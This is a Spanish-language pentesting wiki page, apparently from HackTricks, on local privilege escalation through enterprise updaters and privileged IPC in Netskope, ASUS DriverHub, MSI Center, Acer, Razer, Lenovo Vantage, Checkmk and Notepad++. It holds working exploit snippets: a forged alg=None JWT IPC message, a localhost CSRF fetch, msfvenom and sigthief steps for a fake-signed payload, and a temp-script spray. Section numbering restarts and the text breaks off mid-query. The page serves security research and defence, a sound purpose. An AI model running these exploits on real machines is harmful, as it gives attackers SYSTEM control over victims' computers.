# Abuso de actualizadores empresariales y de IPC privilegiado (p. ej., Netskope, ASUS y MSI)

{{#include ../../banners/hacktricks-training.md}}

Esta página generaliza una clase de cadenas de escalada local de privilegios en Windows detectadas en agentes empresariales de endpoint y actualizadores que exponen una superficie IPC de fácil acceso y un flujo de actualización privilegiado. Un ejemplo representativo es Netskope Client para Windows < R129 (CVE-2025-0309), donde un usuario con pocos privilegios puede forzar el proceso de inscripción para que use un servidor controlado por un atacante y, después, entregar un MSI malicioso que el servicio SYSTEM instala.<sup>[[1]](#references)[[2]](#references)[[5]](#references)</sup>

Ideas clave que puedes reutilizar contra productos similares:
- Abusar del IPC localhost de un servicio privilegiado para forzar una nueva inscripción o reconfiguración hacia un servidor del atacante.
- Implementar los endpoints de actualización del proveedor, entregar una Trusted Root CA fraudulenta y hacer que el actualizador apunte a un paquete malicioso «firmado».
- Evadir comprobaciones débiles del firmante (listas permitidas de CN), indicadores opcionales de digest y propiedades MSI laxas.
- Si el IPC está «cifrado», derivar la clave/IV a partir de identificadores de máquina legibles por todos y almacenados en el registro.
- Si el servicio restringe los procesos que pueden llamarlo según la ruta de la imagen o el nombre del proceso, inyectarse en un proceso incluido en la lista permitida o iniciar uno suspendido y preparar la carga de la DLL mediante un parche mínimo al contexto de subproceso.

Los servicios TCP locales personalizados merecen la misma revisión de identidad y límites de entrada, incluso cuando requieren un PIN u otra credencial de la aplicación. Identifica el proceso asociado al listener y la cuenta de servicio efectiva; después, examina el binario/versión desplegado exacto y comprueba si los campos controlados por el llamador se validan en cuanto a longitud antes de copiarse en búferes de tamaño fijo o usarse para construir el comando de un proceso hijo. [Las recomendaciones de Microsoft sobre desbordamientos de búfer](https://learn.microsoft.com/en-us/windows/win32/secbp/avoiding-buffer-overruns) explican por qué las entradas externas sin validar son peligrosas en código nativo privilegiado. Un listener de loopback, una credencial codificada de forma fija o el nombre de un proceso, por sí solos, no demuestran que exista corrupción de memoria ni ejecución como SYSTEM; la accesibilidad, la autorización, la ruta de código y las mitigaciones son condiciones independientes. Mantén la enumeración rutinaria en modo pasivo, en lugar de enviar entradas de longitud suficiente para provocar un fallo a un servicio activo.

---
## 1) Forzar la inscripción en un servidor del atacante mediante IPC localhost

Muchos agentes incluyen un proceso de interfaz de usuario en modo usuario que se comunica con un servicio SYSTEM mediante TCP localhost usando JSON.

Observado en Netskope:
- UI: stAgentUI (integridad baja) ↔ Servicio: stAgentSvc (SYSTEM)
- ID de comando IPC 148: IDP_USER_PROVISIONING_WITH_TOKEN

Flujo del exploit:
1) Crea un token de inscripción JWT cuyas claims controlen el host del backend (p. ej., AddonUrl). Usa alg=None para no necesitar una firma.
2) Envía el mensaje IPC que invoca el comando de aprovisionamiento con tu JWT y el nombre del tenant:

```json
{
  "148": {
    "idpTokenValue": "<JWT with AddonUrl=attacker-host; header alg=None>",
    "tenantName": "TestOrg"
  }
}
```

3) El servicio empieza a conectarse a tu servidor malicioso para obtener datos de enrollment/config, por ejemplo:
- /v1/externalhost?service=enrollment
- /config/user/getbrandingbyemail

Notas:
- Si la verificación del caller se basa en la ruta/nombre, origina la solicitud desde un binario del proveedor incluido en la lista de permitidos (consulta §4).<sup>[[1]](#references)[[2]](#references)</sup>

### IPC de administración expuesto a la red

Este límite de confianza no siempre se limita a localhost. En el caso reportado de MyReport Updater 2.1.1, un servicio `LocalSystem` escuchaba en todas las interfaces y aceptaba un cambio de configuración gRPC sin autenticación para el host de referencia, el puerto y el modo de operación. Para la variante remota, se requería tanto acceso de red al listener como acceso saliente del servicio a la referencia elegida. Evalúa estos aspectos por separado de si el flujo posterior del paquete puede superar el límite de escritura de archivos.<sup>[[16]](#references)</sup>

---
## 2) Secuestrar el canal de actualización para ejecutar código como SYSTEM

Una vez que el cliente se comunica con tu servidor, implementa los endpoints esperados y dirígelo a un MSI controlado por el atacante. Secuencia típica:

1) /v2/config/org/clientconfig → Devuelve una configuración JSON con un intervalo del updater muy corto, por ejemplo:
```json
{
  "clientUpdate": { "updateIntervalInMin": 1 },
  "check_msi_digest": false
}
```
2) /config/ca/cert → Devuelve un certificado CA PEM. El servicio lo instala en el almacén de raíces de confianza del equipo local.
3) /v2/checkupdate → Proporciona metadatos que apuntan a un MSI malicioso y una versión falsa.

Cómo eludir comprobaciones comunes observadas en la práctica:
- Lista de permitidos de CN del firmante: es posible que el servicio solo compruebe que el CN del Subject sea igual a “netSkope Inc” o “Netskope, Inc.”. Tu CA falsa puede emitir un certificado leaf con ese CN y firmar el MSI.
- Propiedad CERT_DIGEST: incluye una propiedad benigna de MSI llamada CERT_DIGEST. No se aplica ninguna verificación durante la instalación.
- Aplicación opcional del digest: un indicador de configuración (p. ej., check_msi_digest=false) desactiva la validación criptográfica adicional.

Resultado: el servicio SYSTEM instala tu MSI desde
C:\ProgramData\Netskope\stAgent\data\*.msi
y ejecuta código arbitrario como NT AUTHORITY\SYSTEM.<sup>[[1]](#references)[[2]](#references)</sup>

Lección sobre cómo eludir parches: si un proveedor responde creando una lista de permitidos con unos pocos dominios “de confianza” en vez de autenticar criptográficamente el origen de las actualizaciones, busca redireccionadores o proxies inversos propiedad del proveedor que aún te permitan dirigir el tráfico. En el caso de Netskope, investigaciones públicas posteriores demostraron que una lista de permitidos de la época de R129 aún podía ser explotada mediante `rproxy.goskope.com`, que actuaba como proxy del contenido de Azure App Service controlado por el atacante. Considera las listas de permitidos de nombres de host como un obstáculo menor, no como un límite de confianza.<sup>[[14]](#references)</sup>

Otro modo de fallo son los **metadatos de paquetes coherentes entre sí, pero no autenticados**. En el caso de MyReport, una referencia controlada por el atacante servía un archivo modificado, mientras que un intermediario alteraba las respuestas del digest MD5 y del tamaño del proveedor antes de que llegaran al actualizador. Comprobar que esos valores coincidieran verificaba la coherencia de las respuestas, no el origen del proveedor; no se necesitaba ninguna colisión MD5. Después, un directorio de instalación elegido por quien realiza la llamada convertía la extracción privilegiada en un límite de escritura de archivos. La primitiva resultante de carga de DLL se explica en [encadenar una escritura arbitraria de archivos con el secuestro de una DLL faltante](dll-hijacking/#chaining-an-arbitrary-file-write-into-a-missing-dll-hijack).<sup>[[16]](#references)</sup>

---
## 3) Falsificación de solicitudes IPC cifradas (cuando estén presentes)

Desde R127, Netskope envolvió el JSON de IPC en un campo encryptData que parece Base64. La ingeniería inversa reveló que usaba AES con una clave/IV derivada de valores del registro que cualquier usuario puede leer:
- Clave = HKLM\SOFTWARE\NetSkope\Provisioning\nsdeviceidnew
- IV  = HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\ProductID

Los atacantes pueden reproducir el cifrado y enviar comandos cifrados válidos desde una cuenta de usuario estándar.<sup>[[1]](#references)[[2]](#references)</sup> Consejo general: si un agente de pronto “cifra” su IPC, busca identificadores de dispositivo, GUID de producto e identificadores de instalación en HKLM que se utilicen como material criptográfico.

---
## 4) Elusión de listas de permitidos de procesos que llaman por IPC (comprobaciones de ruta/nombre)

Algunos servicios intentan autenticar al interlocutor resolviendo el PID de la conexión TCP y comparando la ruta/nombre de la imagen con los binarios del proveedor incluidos en la lista de permitidos y ubicados bajo Program Files (p. ej., stagentui.exe, bwansvc.exe, epdlp.exe).

Dos métodos prácticos para eludirlo:
- Inyección de DLL en un proceso incluido en la lista de permitidos (p. ej., nsdiag.exe) y envío de IPC en proxy desde dentro de ese proceso.
- Iniciar un binario incluido en la lista de permitidos en estado suspendido y cargar la DLL de proxy de arranque sin CreateRemoteThread (consulta §5) para cumplir las reglas de protección contra manipulaciones aplicadas por el controlador.<sup>[[1]](#references)[[2]](#references)</sup>

---
## 5) Inyección compatible con la protección contra manipulaciones: proceso suspendido + parche de NtContinue

Los productos suelen incluir un controlador minifilter/de devoluciones de llamada OB (p. ej., Stadrv) para quitar derechos peligrosos a los handles de procesos protegidos:
- Proceso: quita PROCESS_TERMINATE, PROCESS_CREATE_THREAD, PROCESS_VM_READ, PROCESS_DUP_HANDLE, PROCESS_SUSPEND_RESUME
- Thread: restringe a THREAD_GET_CONTEXT, THREAD_QUERY_LIMITED_INFORMATION, THREAD_RESUME, SYNCHRONIZE

Un cargador fiable en modo usuario que respeta estas restricciones:
1) Crear un proceso de un binario del proveedor con CREATE_SUSPENDED.
2) Obtener los handles que aún se permiten: PROCESS_VM_WRITE | PROCESS_VM_OPERATION para el proceso y un handle de thread con THREAD_GET_CONTEXT/THREAD_SET_CONTEXT (o solo THREAD_RESUME si parcheas el código en un RIP conocido).
3) Sobrescribir ntdll!NtContinue (u otro thunk temprano con mapeo garantizado) con un stub pequeño que llame a LoadLibraryW con la ruta de tu DLL y luego vuelva al flujo anterior.
4) Reanudar el thread con ResumeThread para ejecutar el stub dentro del proceso y cargar la DLL.

Como nunca usaste PROCESS_CREATE_THREAD ni PROCESS_SUSPEND_RESUME en un proceso ya protegido (lo creaste tú), la política del controlador se cumple.<sup>[[1]](#references)[[2]](#references)</sup>

---
## 6) Herramientas prácticas
- NachoVPN (plugin de Netskope) automatiza una CA falsa, la firma de un MSI malicioso y sirve los endpoints necesarios: /v2/config/org/clientconfig, /config/ca/cert, /v2/checkupdate.<sup>[[3]](#references)</sup>
- UpSkope es un cliente IPC personalizado que crea mensajes IPC arbitrarios (cifrados opcionalmente con AES) e incluye la inyección en procesos suspendidos para enviar mensajes desde un binario incluido en la lista de permitidos.<sup>[[4]](#references)</sup>

## 7) Flujo de trabajo rápido de triaje para superficies de actualizadores/IPC desconocidas

Al analizar un nuevo agente de endpoint o una suite de “ayudantes” de placa base, un flujo de trabajo rápido suele bastar para determinar si tienes delante un objetivo prometedor para privesc:<sup>[[6]](#references)</sup>

1) Enumerar los listeners de loopback y asociarlos con los procesos del proveedor:

```powershell
Get-NetTCPConnection -State Listen |
  Where-Object {$_.LocalAddress -in @('127.0.0.1', '::1', '0.0.0.0', '::')} |
  Select-Object LocalAddress,LocalPort,OwningProcess,
    @{n='Process';e={(Get-Process -Id $_.OwningProcess -ErrorAction SilentlyContinue).Path}}
```

2) Enumerar las named pipes candidatas:

```powershell
[System.IO.Directory]::GetFiles("\\.\pipe\") | Select-String -Pattern 'asus|msi|razer|acer|agent|update'
```

3) Extraer datos de enrutamiento respaldados por el registro que utilizan los servidores IPC basados en plugins:

```powershell
Get-ChildItem 'HKLM:\SOFTWARE\WOW6432Node\MSI\MSI Center\Component' |
  Select-Object PSChildName
```

4) Extrae primero los nombres de los endpoints, las claves JSON y los IDs de comando del cliente en modo usuario. Los frontends empaquetados de Electron/.NET suelen filtrar el esquema completo:

```powershell
Select-String -Path 'C:\Program Files\Vendor\**\*.js','C:\Program Files\Vendor\**\*.dll' `
  -Pattern '127.0.0.1|localhost|UpdateApp|checkupdate|NamedPipe|LaunchProcess|Origin'
```

5) Busca el predicado de confianza real, no solo la ruta de código que finalmente inicia el proceso:

```powershell
Select-String -Path 'C:\Program Files\Vendor\**\*.exe','C:\Program Files\Vendor\**\*.dll','C:\Program Files\Vendor\**\*.js' `
  -Pattern 'WinVerifyTrust|CryptQueryObject|Origin|Referer|Subject|CN=|ExecuteTask|LaunchProcess|CreateProcessAsUser'
```

Patrones a los que conviene dar prioridad:
- `CryptQueryObject`/el análisis de certificados sin `WinVerifyTrust` suele indicar que se consideró que “el certificado existe” significa “el certificado es de confianza”, lo que permite clonar certificados u otros trucos con firmantes falsos.
- Las comprobaciones de subcadenas/sufijos en `Origin`, `Referer`, URL de descarga, nombres de procesos o CN de firmantes no son autenticación. `contains(".vendor.com")` suele ser explotable con dominios similares controlados por un atacante.
- Si la GUI de bajo privilegio decide que “el archivo es de confianza” y el broker de SYSTEM simplemente consume ese resultado, parchear o reimplementar la DLL/JS del lado del cliente suele eludir por completo el límite de seguridad (validación dividida al estilo Razer).
- Si el broker copia un payload a `%TEMP%`/`C:\Windows\Temp` y luego lo valida o programa desde esa ruta, comprueba de inmediato si hay ventanas de reemplazo TOCTOU y si existen módulos de plugin hermanos que expongan wrappers alternativos de `ExecuteTask()` con comprobaciones más débiles.<sup>[[6]](#references)</sup>

Para objetivos que usan muchas named pipes, PipeViewer permite detectar rápidamente DACL débiles y pipes accesibles de forma remota antes de empezar a hacer reversing del protocolo en profundidad.<sup>[[11]](#references)</sup>

Si el objetivo autentica a los clientes solo por PID, ruta de imagen o nombre de proceso, considéralo un obstáculo menor, no un límite de seguridad: a menudo basta con inyectarse en el cliente legítimo o realizar la conexión desde un proceso permitido para satisfacer las comprobaciones del servidor. Para named pipes en concreto, [esta página sobre suplantación de clientes y abuso de pipes](named-pipe-client-impersonation.md) explica el primitive con más detalle.

En un **broker privilegiado de limpieza o restauración**, inspecciona el límite de confianza de las rutas, además de la ACL de la pipe. Un cliente con menos privilegios podría seleccionar un destino de restauración o cambiar el nombre de un artefacto de copia de seguridad preparado en un directorio compartido, incluso si el ejecutable del servicio y su directorio de instalación están protegidos. Confirma por separado que el cliente puede acceder al comando de restauración, modificar la entrada preparada exacta o su nombre de archivo, que el broker se ejecuta con una identidad de mayor privilegio y que la operación de restauración realmente escribe en la ruta protegida seleccionada. Un directorio de preparación con permisos de escritura o una pipe legible no demuestran por sí solos que sea posible realizar una escritura arbitraria privilegiada; la asignación del destino y el comportamiento del servicio deben revisarse en el código o probarse de forma controlada. No ejecutes un comando de limpieza desconocido durante el reconocimiento pasivo, ya que podría eliminar archivos del usuario.

---
## 8) Brokers de add-ins modulares autenticados solo mediante firmas del proveedor (patrón de Lenovo Vantage)

Una variante más reciente que merece buscarse es el **broker RPC con cliente firmado**: un proceso de escritorio Lenovo firmado y con pocos privilegios se comunica con un servicio SYSTEM, y el servicio enruta comandos JSON a un conjunto de add-ins descritos en XML en `%ProgramData%`. Una vez que se consigue ejecución de código **dentro de cualquier cliente firmado aceptado**, todos los contratos `runas="system"` pasan a formar parte de la superficie de ataque.<sup>[[15]](#references)</sup>

Primitives de alto valor observados en investigaciones sobre Lenovo Vantage:
- **Confiar en el cliente porque está firmado por el proveedor**: los investigadores lograron acceder a un contexto autenticado copiando un EXE firmado por Lenovo a un directorio con permisos de escritura y satisfaciendo una carga lateral de DLL (`profapi.dll`) para ejecutar código arbitrario dentro de un cliente en el que el servicio ya confiaba.
- **Descubrimiento de la superficie de ataque mediante manifiestos**: los add-ins se declaran en `C:\ProgramData\Lenovo\Vantage\Addins\*.xml`; varios contratos se ejecutan como `SYSTEM`, así que enumerar esos manifiestos suele revelar los verbos privilegiados reales más rápido que hacer reversing del propio broker.
- **Bugs por comando detrás del canal autenticado**: una vez dentro del cliente de confianza, la investigación pública encontró traversal de rutas + condiciones de carrera en los verbos de actualización/instalación, abuso de SQL sin procesar en bases de datos de configuración privilegiadas y comprobaciones de rutas del registro basadas en subcadenas que permitían escribir fuera del hive previsto.

Reconocimiento útil en un objetivo:

```powershell
Get-ChildItem "$env:ProgramData\Lenovo\Vantage\Addins" -Filter *.xml |
  Select-String -Pattern 'runas="system"|<name>|<namespace>'
```

```powershell
Select-String -Path 'C:\Program Files\Lenovo\**\*.dll','C:\Program Files\Lenovo\**\*.exe' `
  -Pattern 'contract|command|payload|DeleteTable|DeleteSetting|Set-KeyChildren|DownloadAndInstallAppComponent|InstallOnly'
```

Conclusión práctica: siempre que una suite de herramientas auxiliares exponga un broker que primero autentique el **proceso llamante** y solo entonces distribuya las solicitudes entre decenas de comandos de plugins/add-ins, no te detengas tras evadir la comprobación de confianza de entrada. Vuelca la tabla de manifiesto/contratos y fuzz cada verbo de alto privilegio por separado; el canal autenticado suele ocultar varios bugs de segunda etapa.

---
## 1) CSRF de navegador a localhost contra APIs HTTP privilegiadas (ASUS DriverHub)

DriverHub incluye un servicio HTTP en modo usuario (ADU.exe) en 127.0.0.1:53000 que espera llamadas del navegador procedentes de https://driverhub.asus.com. El filtro de origen simplemente realiza `string_contains(".asus.com")` sobre el encabezado Origin y sobre las URL de descarga expuestas por `/asus/v1.0/*`. Por lo tanto, cualquier host controlado por un atacante, como `https://driverhub.asus.com.attacker.tld`, supera la comprobación y puede enviar solicitudes que modifican el estado desde JavaScript.<sup>[[6]](#references)</sup> Consulta [conceptos básicos de CSRF](../../pentesting-web/csrf-cross-site-request-forgery.md) para ver otros patrones de bypass.

Flujo práctico:
1) Registra un dominio que incluya `.asus.com` y aloja allí una página web maliciosa.
2) Usa `fetch` o XHR para llamar a un endpoint privilegiado (p. ej., `Reboot`, `UpdateApp`) en `http://127.0.0.1:53000`.
3) Envía el cuerpo JSON que espera el handler; el JS frontend empaquetado muestra el esquema a continuación.

```javascript
fetch("http://127.0.0.1:53000/asus/v1.0/Reboot", {
  method: "POST",
  headers: { "Content-Type": "application/json" },
  body: JSON.stringify({ Event: [{ Cmd: "Reboot" }] })
});
```

Incluso la CLI de PowerShell que se muestra a continuación tiene éxito cuando se suplanta el encabezado Origin con el valor de confianza:

```powershell
Invoke-WebRequest -Uri "http://127.0.0.1:53000/asus/v1.0/Reboot" -Method Post \
  -Headers @{Origin="https://driverhub.asus.com"; "Content-Type"="application/json"} \
  -Body (@{Event=@(@{Cmd="Reboot"})}|ConvertTo-Json)
```

Cualquier visita del navegador al sitio del atacante se convierte, por tanto, en un CSRF local de 1 clic (o de 0 clic mediante `onload`) que controla un helper con privilegios SYSTEM.

---
## 2) Verificación insegura de firma de código y clonación de certificados (ASUS UpdateApp)

`/asus/v1.0/UpdateApp` descarga ejecutables arbitrarios definidos en el cuerpo JSON y los almacena en caché en `C:\ProgramData\ASUS\AsusDriverHub\SupportTemp`. La validación de la URL de descarga reutiliza la misma lógica de subcadenas, por lo que se acepta `http://updates.asus.com.attacker.tld:8000/payload.exe`. Después de la descarga, ADU.exe solo comprueba que el PE tenga una firma y que la cadena Subject coincida con ASUS antes de ejecutarlo: no usa `WinVerifyTrust` ni valida la cadena de certificados.

Para aprovechar este flujo:
1) Crea un payload (por ejemplo, `msfvenom -p windows/exec CMD=notepad.exe -f exe -o payload.exe`).
2) Clona en él el firmante de ASUS (por ejemplo, `python sigthief.py -i ASUS-DriverHub-Installer.exe -t payload.exe -o pwn.exe`).
3) Aloja `pwn.exe` en un dominio parecido a `.asus.com` y activa UpdateApp mediante el CSRF del navegador anterior.

Como tanto los filtros de Origin como los de URL se basan en subcadenas, y la comprobación del firmante solo compara cadenas, DriverHub descarga y ejecuta el binario del atacante con sus privilegios elevados.<sup>[[6]](#references)</sup>

---
## 1) TOCTOU en las rutas de copia/ejecución del actualizador (MSI Center CMD_AutoUpdateSDK)

El servicio SYSTEM de MSI Center expone un protocolo TCP en el que cada trama tiene el formato `4-byte ComponentID || 8-byte CommandID || ASCII arguments`. El componente principal (Component ID `0f 27 00 00`) incluye `CMD_AutoUpdateSDK = {05 03 01 08 FF FF FF FC}`. Su handler:
1) Copia el ejecutable proporcionado en `C:\Windows\Temp\MSI Center SDK.exe`.
2) Verifica la firma mediante `CS_CommonAPI.EX_CA::Verify` (el Subject del certificado debe ser igual a “MICRO-STAR INTERNATIONAL CO., LTD.” y `WinVerifyTrust` debe tener éxito).
3) Crea una tarea programada que ejecuta el archivo temporal como SYSTEM con argumentos controlados por el atacante.

El archivo copiado no queda bloqueado entre la verificación y `ExecuteTask()`. Un atacante puede:
- Enviar la trama A con un binario legítimo firmado por MSI (garantiza que la comprobación de firma se supere y que la tarea quede en cola).
- Competir con ella enviando repetidamente mensajes de trama B que apunten a un payload malicioso, sobrescribiendo `MSI Center SDK.exe` justo después de que termine la verificación.

Cuando se active el programador, ejecutará el payload sobrescrito como SYSTEM, aunque haya validado el archivo original. Para explotar esto de forma fiable, se usan dos goroutines/threads que envían spam a CMD_AutoUpdateSDK hasta ganar la ventana TOCTOU.<sup>[[6]](#references)</sup>

---
## 2) Abuso de IPC personalizado con privilegios SYSTEM e impersonation (MSI Center + Acer Control Centre)

### Conjuntos de comandos TCP de MSI Center
- Cada plugin/DLL cargado por `MSI.CentralServer.exe` recibe un Component ID almacenado en `HKLM\SOFTWARE\MSI\MSI_CentralServer`. Los primeros 4 bytes de una trama seleccionan ese componente, lo que permite a los atacantes dirigir comandos a módulos arbitrarios.
- Los plugins pueden definir sus propios ejecutores de tareas. `Support\API_Support.dll` expone `CMD_Common_RunAMDVbFlashSetup = {05 03 01 08 01 00 03 03}` y llama directamente a `API_Support.EX_Task::ExecuteTask()` **sin validación de firma**: cualquier usuario local puede apuntarlo a `C:\Users\<user>\Desktop\payload.exe` y obtener ejecución como SYSTEM de forma determinista.
- Capturar el loopback con Wireshark o instrumentar los binarios .NET en dnSpy permite descubrir rápidamente la correspondencia entre componentes y comandos; después, clientes personalizados en Go/Python pueden reproducir las tramas.<sup>[[6]](#references)</sup>

### Named pipes de Acer Control Centre y niveles de impersonation
- `ACCSvc.exe` (SYSTEM) expone `\\.\pipe\treadstone_service_LightMode`, y su ACL discrecional permite clientes remotos (por ejemplo, `\\TARGET\pipe\treadstone_service_LightMode`). Al enviar el ID de comando `7` con una ruta de archivo, se invoca la rutina del servicio que inicia procesos.
- La biblioteca del cliente serializa un byte terminador mágico (113) junto con los argumentos. La instrumentación dinámica con Frida/`TsDotNetLib` (consulta [Reversing Tools & Basic Methods](../../reversing/reversing-tools-basic-methods/README.md) para ver consejos de instrumentación) muestra que el handler nativo asigna este valor a un `SECURITY_IMPERSONATION_LEVEL` y a un SID de integridad antes de llamar a `CreateProcessAsUser`.
- Cambiar 113 (`0x71`) por 114 (`0x72`) conduce a la rama genérica, que conserva el token SYSTEM completo y establece un SID de integridad alta (`S-1-16-12288`). Por tanto, el binario iniciado se ejecuta como SYSTEM sin restricciones, tanto localmente como entre máquinas.
- Combínalo con la opción de instalador expuesta (`Setup.exe -nocheck`) para instalar ACC incluso en máquinas virtuales de laboratorio y probar el pipe sin hardware del proveedor.<sup>[[6]](#references)</sup>

Estos errores de IPC muestran por qué los servicios localhost deben exigir autenticación mutua (SIDs de ALPC, filtros `ImpersonationLevel=Impersonation`, filtrado de tokens) y por qué el helper de cada módulo para “ejecutar binarios arbitrarios” debe aplicar las mismas verificaciones de firmante.

---
## 3) Helpers “elevator” de COM/IPC respaldados por una validación débil en modo usuario (Razer Synapse 4)

Razer Synapse 4 añadió otro patrón útil a esta familia: un usuario con pocos privilegios puede pedir a un helper COM que inicie un proceso mediante `RzUtility.Elevator`, mientras que la decisión de confianza se delega a una DLL en modo usuario (`simple_service.dll`) en vez de aplicarse de forma robusta dentro del límite privilegiado.

Ruta de explotación observada:
- Instanciar el objeto COM `RzUtility.Elevator`.
- Llamar a `LaunchProcessNoWait(<path>, "", 1)` para solicitar un inicio con privilegios elevados.
- En el PoC público, se parchea la comprobación de firma PE dentro de `simple_service.dll` antes de enviar la solicitud, lo que permite iniciar un ejecutable arbitrario elegido por el atacante.<sup>[[6]](#references)[[10]](#references)</sup>

Invocación mínima en PowerShell:

```powershell
$com = New-Object -ComObject 'RzUtility.Elevator'
$com.LaunchProcessNoWait("C:\Users\Public\payload.exe", "", 1)
```

Conclusión general: al hacer reversing de suites «helper», no te limites a TCP en localhost o a named pipes. Busca clases COM con nombres como `Elevator`, `Launcher`, `Updater` o `Utility`; luego verifica si el servicio privilegiado valida el binario de destino por sí mismo o si simplemente confía en un resultado calculado por una DLL cliente en modo usuario que se puede parchear. Este patrón va más allá de Razer: cualquier diseño dividido en el que el broker de altos privilegios consume una decisión de permitir/denegar de la parte de bajos privilegios es una posible superficie de privesc.


---
## Ejecución predecible de scripts temporales durante la reparación de MSI (Checkmk Agent / CVE-2024-0670)

Algunos agentes de Windows todavía implementan acciones privilegiadas escribiendo un `.cmd` temporal en `C:\Windows\Temp` y ejecutándolo como `SYSTEM`. Si el nombre del archivo es predecible y el servicio no recrea de forma segura los archivos existentes, un usuario con pocos privilegios puede crear por adelantado el futuro archivo temporal como **de solo lectura** y hacer que el proceso privilegiado ejecute contenido controlado por el atacante en lugar de su propio script.

Observado en versiones vulnerables de Checkmk Agent:
- patrón temporal: `cmk_all_<PID>_1.cmd`
- ramas afectadas: `2.0.0`, `2.1.0`, `2.2.0`
- activador: **reparación** del paquete MSI almacenado en caché del agente<sup>[[8]](#references)[[9]](#references)</sup>

Flujo de trabajo práctico:
1. Calcula un rango realista de PID a partir de los ID de proceso actuales o del PID del agente en ejecución.
2. Escribe un payload `.cmd` corto en **ASCII** (`Set-Content -Encoding Ascii` o redirección de `cmd.exe`; evita la salida de PowerShell en UTF-16 para los archivos batch).
3. Haz spray de `C:\Windows\Temp\cmk_all_<PID>_1.cmd` en el rango candidato y marca cada archivo como de solo lectura.
4. Activa una reparación del MSI almacenado en caché para que el servicio privilegiado intente regenerar y luego ejecutar el script temporal.<sup>[[7]](#references)</sup>

```powershell
Set-Content -Path C:\ProgramData\payload.cmd -Encoding Ascii -Value "@echo off`nwhoami > C:\ProgramData\proof.txt"
1..10000 | ForEach-Object {
  Copy-Item C:\ProgramData\payload.cmd "C:\Windows\Temp\cmk_all_${_}_1.cmd"
  Set-ItemProperty "C:\Windows\Temp\cmk_all_${_}_1.cmd" -Name IsReadOnly -Value $true
}
```

Si el producto vulnerable está instalado con Windows Installer, identifica el nombre del producto asociado al MSI de aspecto aleatorio almacenado en caché en `C:\Windows\Installer` antes de iniciar la reparación:<sup>[[7]](#references)</sup>

```powershell
Get-ChildItem "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Installer\UserData\S-1-5-18\Products\*\InstallProperties" |
  ForEach-Object {
    $p = Get-ItemProperty $_.PSPath
    [PSCustomObject]@{Name=$p.DisplayName; Pkg=$p.LocalPackage}
  } | Where-Object Name -like "*Check MK Agent*"

msiexec /fa C:\Windows\Installer\<cached-agent>.msi
```

Notas operativas:
- `qwinsta` es útil cuando `msiexec /fa` falla desde un shell de WinRM no interactivo y necesitas averiguar si una sesión de escritorio existente o desconectada puede activar correctamente la reparación.<sup>[[7]](#references)</sup>
- Este patrón se aplica también a otros agentes de endpoint y actualizadores que **preparan scripts temporales en ubicaciones con permisos de escritura para todos y luego los ejecutan como SYSTEM**. Comprueba si los nombres son predecibles, si falta la semántica de creación exclusiva y si los flujos de reparación/actualización pueden activarse a demanda.

### Reparación interactiva del instalador y consola con privilegios

PDF24 Creator 11.15.1 ilustra un riesgo distinto de reparación de MSI: su acción personalizada de instalación de impresora puede iniciar una consola visible con permisos de SYSTEM durante la reparación. El proveedor modificó el instalador MSI en la versión 11.15.2 para corregir este comportamiento. Una versión antigua del producto es solo una pista para el triaje. Comprueba el paquete MSI registrado o accesible, si este usuario puede iniciar la reparación, si están presentes la acción personalizada vulnerable y el retardo del archivo de registro, y si un escritorio interactivo puede mostrar la consola. El retardo informado usaba un oplock en `faxPrnInst.log`; la posibilidad de escribir en el archivo no es la única condición de acceso. Un shell no interactivo, un paquete inaccesible o un instalador parcheado pueden romper la cadena. Este problema no depende de `AlwaysInstallElevated` y es distinto de reemplazar un script temporal predecible.

---
## Secuestro remoto de la cadena de suministro mediante validación débil del actualizador (WinGUp / Notepad++)

Entre junio y diciembre de 2025, atacantes que comprometieron la infraestructura de alojamiento detrás del flujo de actualización de Notepad++ sirvieron selectivamente manifiestos maliciosos a víctimas elegidas. Los actualizadores antiguos basados en WinGUp no verificaban por completo la autenticidad de las actualizaciones, por lo que una respuesta XML maliciosa podía redirigir a los clientes a URL controladas por los atacantes. Como el cliente aceptaba contenido HTTPS sin exigir tanto una cadena de certificados de confianza como una firma PE válida en el instalador descargado, las víctimas descargaban y ejecutaban un `update.exe` de NSIS con un troyano.<sup>[[12]](#references)[[13]](#references)</sup>

Flujo operativo (no se requiere ningún exploit local):
1. **Intercepción de infraestructura**: comprometer la CDN/el alojamiento y responder a las comprobaciones de actualización con metadatos del atacante que apunten a una URL de descarga maliciosa.
2. **NSIS con troyano**: el instalador descarga/ejecuta una carga útil y abusa de dos cadenas de ejecución:
   - **Bring-your-own signed binary + sideload**: incluir el `BluetoothService.exe` firmado de Bitdefender y colocar una `log.dll` maliciosa en su ruta de búsqueda. Cuando se ejecuta el binario firmado, Windows carga mediante sideload `log.dll`, que descifra y carga de forma reflectiva la puerta trasera Chrysalis (protegida con Warbird y con hashing de API para dificultar la detección estática).
   - **Scripted shellcode injection**: NSIS ejecuta un script Lua compilado que utiliza API de Win32 (p. ej., `EnumWindowStationsW`) para inyectar shellcode y preparar Cobalt Strike Beacon.<sup>[[12]](#references)</sup>

Recomendaciones de hardening/detección para cualquier actualizador automático:
- Exigir **la verificación del certificado y de la firma** del instalador descargado (fijar la clave de firma del proveedor y rechazar los CN/cadenas que no coincidan) y firmar el propio manifiesto de actualización (p. ej., con XMLDSig). Bloquear las redirecciones controladas por el manifiesto, salvo que se validen.
- Considerar el **BYO signed binary sideloading** como una oportunidad de detección posterior a la descarga: generar una alerta cuando un EXE firmado del proveedor carga una DLL desde fuera de su ruta de instalación canónica (p. ej., Bitdefender carga `log.dll` desde Temp/Downloads) y cuando un actualizador deposita o ejecuta instaladores desde una ubicación temporal con firmas que no pertenecen al proveedor.
- Supervisar los **indicadores específicos del malware** observados en esta cadena (útiles como indicadores genéricos): el mutex `Global\Jdhfv_1.0.1`, escrituras anómalas de `gup.exe` en `%TEMP%` y las etapas de inyección de shellcode impulsadas por Lua.
- Notepad++ respondió reforzando WinGUp en la versión v8.8.9 y posteriores: ahora el XML devuelto está firmado (XMLDSig), y las versiones más recientes exigen la verificación del certificado y la firma del instalador descargado, en lugar de confiar únicamente en el transporte.<sup>[[13]](#references)</sup>

<details>
<summary>Cortex XDR XQL – Carga mediante sideload de <code>log.dll</code> por un EXE firmado de Bitdefender (T1574.001)</summary>

```sql
// Identifies Bitdefender-signed processes loading log.dll outside vendor paths
config case_sensitive = false
| dataset = xdr_data
| fields actor_process_signature_vendor, actor_process_signature_product, action_module_path, actor_process_image_path, actor_process_image_sha256, agent_os_type, event_type, event_id, agent_hostname, _time, actor_process_image_name
